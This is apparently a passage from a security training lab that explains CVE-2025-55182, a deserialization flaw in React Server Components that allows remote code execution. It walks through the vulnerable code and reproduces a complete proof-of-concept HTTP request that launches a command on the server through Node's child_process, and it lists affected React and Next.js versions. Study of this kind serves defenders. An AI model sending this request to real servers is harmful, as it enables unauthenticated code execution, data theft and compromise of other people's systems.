React Server Components is a feature introduced in React 19 that allows components to be rendered on the server rather than the client’s browser

Before we can grasp the vulnerability, we need to understand the architecture of React Server Components. React Server Components is a feature introduced in React 19 that allows components to be rendered on the server rather than the client’s browser. This provides significant performance benefits, as the server can handle computationally intensive tasks whilst sending only the rendered output to the client.

The communication between the server and client in RSC relies on a protocol called **React Flight**. This protocol handles the serialisation and deserialisation of data being transmitted between the server and client. When a client needs to invoke a server-side function (called a “Server Action”), it sends a specially formatted request containing serialised data that the server deserialises and processes.

The Flight protocol uses a specific serialisation format with type markers. For example:

- `$@` denotes a chunk reference
- `$B` denotes a Blob reference
- References can include property paths using colon separation (e.g., `$1:constructor:constructor`)

This serialisation mechanism is where the vulnerability lies. The server processes these references without properly validating that the requested properties are legitimate exports from the intended module.

CVE-2025-55182 is fundamentally an **unsafe deserialization vulnerability** in how React Server Components handle incoming Flight protocol payloads. The vulnerability exists in the `requireModule` function within the `react-server-dom-webpack` package. Let’s examine the problematic code pattern:

```javascript
function requireModule(metadata) {  
 var moduleExports = __webpack_require__(metadata[0]);  
 // ... additional logic ...  
 return moduleExports[metadata[2]];  // VULNERABLE LINE  
}  
```

The critical flaw is in the bracket notation access `moduleExports[metadata[2]]`. In JavaScript, when we access a property using bracket notation, the engine doesn’t just check the object’s own properties—it traverses the entire prototype chain. This means an attacker can reference properties that weren’t explicitly exported by the module.

Most importantly, every JavaScript function has a `constructor` property that points to the `Function` constructor. By accessing `someFunction.constructor`, an attacker obtains a reference to the global `Function` constructor, which can execute arbitrary JavaScript code when invoked with a string argument.

The vulnerability becomes exploitable because React’s Flight protocol allows clients to specify these property paths through the colon-separated reference syntax. An attacker can craft a reference like `$1:constructor:constructor` which traverses:

1. Get chunk/module 1
2. Access its `.constructor` property (gets the Function constructor)
3. Access `.constructor` again (still the Function constructor, but confirms the chain).
   
   Now let’s dissect how [maple3142’s proof-of-concept](https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http) achieves remote code execution. The exploit cleverly chains together multiple JavaScript engine behaviours to transform a deserialization bug into arbitrary code execution.

**Stage 1: Creating a Fake Chunk Object**

The exploit begins by sending a multipart form request with three fields. The first field contains a carefully crafted fake chunk object:

```json
{  
 "then": "$1:__proto__:then",  
 "status": "resolved_model",  
 "reason": -1,  
 "value": "{\\"then\\":\\"$B1337\\"}",  
 "_response": {  
   "_prefix": "process.mainModule.require('child_process').execSync('xcalc');",  
   "_chunks": "$Q2",  
   "_formData": {  
     "get": "$1:constructor:constructor"  
   }  
 }  
}
```

This object mimics React’s internal `Chunk` class structure. By setting `then` to reference `Chunk.prototype.then`, we’re creating a self-referential structure. When React processes this and awaits the chunk, it invokes the `then` method with the fake chunk as the context (`this`).

**Stage 2: Exploiting the Blob Deserialization Handler**

The second critical component is the `$B` handler reference (`$B1337`). In React’s Flight protocol, the `$B` prefix indicates a Blob reference. When React processes a Blob reference, it calls a function that internally uses `response._formData.get(response._prefix + id)`.

Here’s where the exploitation becomes elegant: we’ve polluted the `_response` object with our malicious properties. When the Blob handler executes:

```javascript
response._formData.get(response._prefix + id)  
```

It actually executes:

```javascript
Function("process.mainModule.require('child_process').execSync('xcalc');1337")  
```

Let’s break down why: we’ve set `_formData.get` to point to `$1:constructor:constructor`, which resolves to the `Function` constructor. The `_prefix` contains our malicious code. When these are combined, the `Function` constructor is invoked with our code as a string argument, creating and implicitly executing a function containing our arbitrary JavaScript.

**Stage 3: Achieving Code Execution**

The payload `process.mainModule.require('child_process').execSync('xcalc')` demonstrates the power of this exploit. We’re using Node.js’s module system to:

1. Access `process.mainModule` (the main module being executed)
2. Use its `require` method to load the `child_process` module
3. Call `execSync` to execute an operating system command
4. In this case, launching the calculator application (`xcalc`) as proof of exploitation

This could easily be modified to establish a reverse shell, exfiltrate environment variables containing secrets, read sensitive files, or perform any operation the Node.js process has permissions to execute.

Answer the questions below

Let’s analyse an actual proof-of-concept exploit in the next task.

Let’s examine the complete HTTP request from maple3142’s PoC:

```http
POST / HTTP/1.1  
Host: localhost  
Next-Action: x  
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad

------WebKitFormBoundaryx8jO2oVc6SWP3Sad  
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('xcalc');","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}  
------WebKitFormBoundaryx8jO2oVc6SWP3Sad  
Content-Disposition: form-data; name="1"

"$@0"  
------WebKitFormBoundaryx8jO2oVc6SWP3Sad  
Content-Disposition: form-data; name="2"

[]  
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--  
```

The `Next-Action: x` header triggers React’s Server Action processing. The multipart body contains three parts:

- **Field 0**: The fake chunk object with our malicious `_response` structure
- **Field 1**: A reference `$@0` that points back to field 0, creating the self-reference
- **Field 2**: An empty array, completing the required structure

When the server processes this request, it deserialises field 0, encounters the $@0 reference in field 1, establishes the self-referential then property, and subsequently triggers the Blob handler, which executes our code through the `Function` constructor.

## Vulnerable Versions and Attack Surface

CVE-2025-55182 affects React Server Components in the following versions:

- React 19.0.0, 19.1.0, 19.1.1, and 19.2.0
- Next.js versions ≥14.3.0-canary.77, all 15.x, and 16.x releases prior to patching
- Other frameworks using RSC: React Router (RSC mode), Waku, Redwood SDK, and various RSC plugins

The vulnerability is particularly dangerous because:

1. **Default configurations are vulnerable** - A standard Next.js application created with `create-next-app` is exploitable without any code changes
2. **No authentication required** - The attack works without any credentials
3. **High reliability** - Security researchers report near 100% exploitation success rates
4. **Wide deployment** - Wiz Research data shows 39% of cloud environments contain vulnerable instances

According to Shodan, over 571,000 public servers utilise React components, and 444,000 use Next.js. Whilst not all of these are vulnerable versions, the potential attack surface is enormous.

